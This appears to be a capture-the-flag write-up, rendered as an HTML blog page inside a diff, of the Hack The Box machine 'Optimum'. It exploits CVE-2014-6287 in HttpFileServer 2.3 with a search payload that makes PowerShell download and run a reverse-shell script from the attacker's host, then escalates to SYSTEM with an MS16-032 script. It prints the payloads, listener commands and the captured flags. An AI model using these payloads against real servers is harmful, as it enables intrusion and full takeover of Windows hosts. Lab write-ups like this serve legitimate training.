@@ -1,0 +1,308 @@
+I"�P<h2 id="enumeration">Enumeration</h2>
+<h3 id="nmap-scan">Nmap Scan</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>└─$ nmap -sC -sV -oN nmap-scan 10.129.202.151
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p><strong>Result</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre></td> --><td class="rouge-code"><pre># Nmap 7.93 scan initiated Wed Apr  5 08:46:32 2023 as: nmap -sC -sV -oN nmap-scan 10.129.202.151
+Nmap scan report for 10.129.202.151
+Host is up (0.26s latency).
+Scanned at 2023-04-05 08:46:34 EAT for 51s
+Not shown: 999 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    HttpFileServer httpd 2.3
+|_http-server-header: HFS 2.3
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+|_http-title: HFS /
+|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Apr  5 08:47:25 2023 -- 1 IP address (1 host up) scanned in 53.41 seconds
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>After scanning only port <code class="language-plaintext highlighter-rouge">80</code> is up and this is web server</p>
+
+<p><img src="/assets/img/optimum//01.png" alt="image" /></p>
+
+<p>I tested for <code class="language-plaintext highlighter-rouge">sql</code> injection but no luck then i decided to check for the information which site provides by itself and the first thing to check was the message with some sort of the name and version of this web <a href="http://www.rejetto.com/hfs/">HttpFileServer 2.3</a></p>
+
+<p>I searched first for <code class="language-plaintext highlighter-rouge">HFS</code> to know what it is and how does it work. Then i found out <code class="language-plaintext highlighter-rouge">HFS</code> is a small HTTP file server, aimed at mostly sharing files for download. <code class="language-plaintext highlighter-rouge">HFS</code> is different from classic file sharing because there is no network. <code class="language-plaintext highlighter-rouge">HFS</code> is a web server which uses web technology to be more compatible with today’s Internet. <code class="language-plaintext highlighter-rouge">HFS</code> includes its own proprietary scripting language known as <code class="language-plaintext highlighter-rouge">macros</code>, which can be used to expand functionality of the program. Scripts can be used in a variety of methods including event handlers and directly on web pages. Macros can even be written to bypass the program’s account system with a custom one</p>
+
+<p>After this knowledge i did some few findings to check if this version has a know vulnerability and i found the <a href="https://nvd.nist.gov/vuln/detail/CVE-2014-6287">CVE-2014-6287</a> the vulnerability is caused by <code class="language-plaintext highlighter-rouge">findMacroMarker</code> function in <code class="language-plaintext highlighter-rouge">parserLib.pas</code> in <code class="language-plaintext highlighter-rouge">Rejetto</code> HTTP File Server (aks HFS or HttpFileServer) 2.3x before 2.3c allows remote attackers to execute arbitrary programs via a <code class="language-plaintext highlighter-rouge">%00</code> sequence in a search action</p>
+
+<p>In searching action where i tested before the <code class="language-plaintext highlighter-rouge">sqli</code> is the right place where there is a vulnerability which allows code execution. The <code class="language-plaintext highlighter-rouge">CVE</code> says that the execution is possible via <code class="language-plaintext highlighter-rouge">%00</code> which is equivalent to <code class="language-plaintext highlighter-rouge">0</code>  <code class="language-plaintext highlighter-rouge">null byte</code> then this cause <code class="language-plaintext highlighter-rouge">HFS</code> versions 2.3, 2.3a, and 2.3b to be vulnerable  due to a regular expression in <code class="language-plaintext highlighter-rouge">parserLib.pas</code> that fails to handle null bytes.
+In search action an attacker can do the following <code class="language-plaintext highlighter-rouge">%00{.exec|malicious_codes}</code> .</p>
+<h2 id="shell-as-kostas">Shell as kostas.</h2>
+<p>To exploit this machine i followed <a href="https://vk9-sec.com/hfs-code-execution-cve-2014-6287/">vk9-sec</a>  blog post which elaborates clearly on how to exploit the <code class="language-plaintext highlighter-rouge">HttpFileServer 2.3</code> and here are the steps:</p>
+
+<p><strong>Step 01</strong></p>
+
+<p>Intercept  request with burpsuite</p>
+
+<p><img src="/assets/img/optimum//02.png" alt="image" /></p>
+
+<p><strong>Step 02</strong></p>
+
+<p>In search action change it malicious payload and to make sure that there is hit then try to ping your own system make sure to listen the response by using <code class="language-plaintext highlighter-rouge">tcpdump</code> and specify the interface <code class="language-plaintext highlighter-rouge">tun0</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/C7F5/htb/OSCP/Optimum]
+└─$ sudo tcpdump -i tun0 icmp
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="/assets/img/optimum//04.png" alt="image" /></p>
+
+<p><strong>Result</strong></p>
+
+<p><img src="/assets/img/optimum//03.png" alt="image" /></p>
+
+<p><strong>Step 03</strong>
+Since i get a ping back then i will download <a href="https://github.com/samratashok/nishang">nishang</a> and navigate to  <code class="language-plaintext highlighter-rouge">shells</code> and open  <code class="language-plaintext highlighter-rouge">Invoke-PowerShellTcp.ps1</code> . In this script change some few things such as follows</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Copy the above command and place at the bottom of the script and then do some changes such as add your <code class="language-plaintext highlighter-rouge">tun0</code> ip address, port number can remain the same.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td> --><td class="rouge-code"><pre>    catch
+    {
+        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
+        Write-Error $_
+    }
+}
+Invoke-PowerShellTcp -Reverse 10.10.14.27 -Port 9005
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p><strong>Step 04</strong></p>
+
+<p>Start python server to host the script</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/Optimum/exploit/nishang/Shells]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p><strong>Step 05</strong><br />
+Start listener for a remote connection.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/C7F5/htb/OSCP/Optimum]
+└─$ nc -nlvp 9005
+listening on [any] 9005 ...
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p><strong>Step 06</strong></p>
+
+<p>Send the payload with burpsuite and wait for the remote connection.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>/?search=%00{.exec|C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe iex(new-object net.webclient).downloadString('http://10.10.14.27/Invoke-PowerShellTcp.ps1').}
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>It is important to specify the full path so that to tell which version should <code class="language-plaintext highlighter-rouge">powershell</code> run with.</p>
+
+<p><img src="/assets/img/optimum//05.png" alt="image" /></p>
+
+<p><strong>Result</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td> --><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/C7F5/htb/OSCP/Optimum]
+└─$ nc -nlvp 9005
+listening on [any] 9005 ...
+connect to [10.10.14.27] from (UNKNOWN) [10.129.202.151] 49209
+Windows PowerShell running as user kostas on OPTIMUM
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Users\kostas\Desktop&gt;
+PS C:\Users\kostas\Desktop&gt; whoami
+optimum\kostas
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p><strong>User Flag</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre></td> --><td class="rouge-code"><pre>PS C:\Users\kostas\Desktop&gt; dir  
+
+
+    Directory: C:\Users\kostas\Desktop
+
+
+Mode                LastWriteTime     Length Name                                                                      
+----                -------------     ------ ----                                                                      
+-a---         18/3/2017   2:11 ??     760320 hfs.exe                                                                   
+-ar--         11/4/2023   5:43 ??         34 user.txt                                                                  
+
+
+PS C:\Users\kostas\Desktop&gt; type user.txt
+e5c2e3ff795************************
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>To check for windows vulnerabilities different tools can be used such as <code class="language-plaintext highlighter-rouge">sherlock</code>, <code class="language-plaintext highlighter-rouge">Windows-Exploit-Suggester</code>  but  i will use <a href="https://github.com/Pwnistry/Windows-Exploit-Suggester-python3">Windows-Exploit-Suggester</a> but to run it two files must be available one is the file with <code class="language-plaintext highlighter-rouge">systeminfo</code> of the machine you want to attack and another file is the database file, you can update the suggester or you can download it form here <a href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/win-exp-suggester/2017-06-14-mssb.xls">Database</a>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/OSCP/Optimum/exploit/Windows-Exploit-Suggester-python3]                                                                                      
+└─$ python windows-exploit-suggester.py -i ../systeminfo -d 2017-06-14-mssb.xls
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p><strong>Result</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td> --><td class="rouge-code"><pre>[E]
+MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
+[*]
+  https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
+[*]
+  https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
+[*]
+  https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 &amp; Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
+[*]
+  https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 &amp; Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
+[*]
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>It will indicate some exploits links and also  i need one which will open <code class="language-plaintext highlighter-rouge">poweshell</code> and not <code class="language-plaintext highlighter-rouge">cmd</code> also  these exploits wont because of the i get shell as <code class="language-plaintext highlighter-rouge">32</code> systems then all interpretation is based on that. Now i have to get new shell with <code class="language-plaintext highlighter-rouge">64</code> .</p>
+
+<p>To know the architecture tun the followings:-</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre>PS C:\Users\kostas\Desktop&gt;  [Environment]::Is64BitProcess
+False
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>To understand more check <a href="https://ss64.com/nt/syntax-64bit.html">ss64</a></p>
+
+<p>To get new shell i should change from</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>/?search=%00{.exec|C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe iex(new-object net.webclient).downloadString('http://10.10.14.27/Invoke-PowerShellTcp.ps1').}
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>To the followings:-</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>/?search=%00{.exec|C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe iex(new-object net.webclient).downloadString('http://10.10.14.27/Invoke-PowerShellTcp.ps1').}
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>I used the same steps a before to get the shell but i only change from <code class="language-plaintext highlighter-rouge">System32</code> to <code class="language-plaintext highlighter-rouge">SysNative</code> so now if check for the architecture again.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre>PS C:\Users\kostas\Desktop&gt;[Environment]::Is64BitProcess
+True
+</pre></td></tr></tbody></table></code></pre></div></div>
+<h3 id="system-user">System user</h3>
+<p>Here i will use some steps to have the shell as system</p>
+
+<p><strong>Step 01</strong></p>
+
+<p>I will use <code class="language-plaintext highlighter-rouge">Empire</code>  it is already installed in Kali Linux and i will the <code class="language-plaintext highlighter-rouge">Invoke-MS16032.ps1</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/C7F5/htb/OSCP/Optimum]
+└─$ locate Invoke-MS16032
+/usr/share/powershell-empire/empire/server/data/module_source/privesc/Invoke-MS16032.ps1
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Now i will copy it t my home directory and do some alterations</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/C7F5/htb/OSCP/Optimum]
+└─$ cp /usr/share/powershell-empire/empire/server/data/module_source/privesc/Invoke-MS16032.ps1 .
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Now add the following line at the end of the script.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>Invoke-MS16-032 -Cmd "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.35:8001/Invoke-PowerShellTcp.ps1')"
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>**Step 02 **</p>
+
+<p>Since i have to get shell again, then i will use the same <code class="language-plaintext highlighter-rouge">Invoke-PowerSehllTCP</code> but now i will edit the name to avoid confusion with the initial file and change modify the file as before by adding this line at the end of the file.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.35 -Port 9006
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p><strong>Step 03</strong></p>
+
+<p>Transfer file to Windows</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td> --><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/C7F5/htb/OSCP/Optimum]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+
+
+PS C:\Users\kostas\Desktop&gt; iwr http://10.10.14.35/Invoke-MS16032.ps1 -outf Invoke-MS16032.ps1 
+PS C:\Users\kostas\Desktop&gt;
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p><strong>Step 04</strong></p>
+
+<p>Run the script <code class="language-plaintext highlighter-rouge">Invoke-MS16032.ps1</code> while listening to <code class="language-plaintext highlighter-rouge">9006</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/C7F5/htb/OSCP/Optimum]
+└─$ nc -nlvp 9006
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p><strong>Result</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre>PS C:\Users\kostas\Desktop&gt;whoami
+nt authority\system
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Now i have the shell back as system user</p>
+
+<p><strong>System Flag</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre>PS C:\Users\administrator\desktop&gt; type root.txt
+942971c8bf0d360754cf5345a3786247
+</pre></td></tr></tbody></table></code></pre></div></div>
+:ET
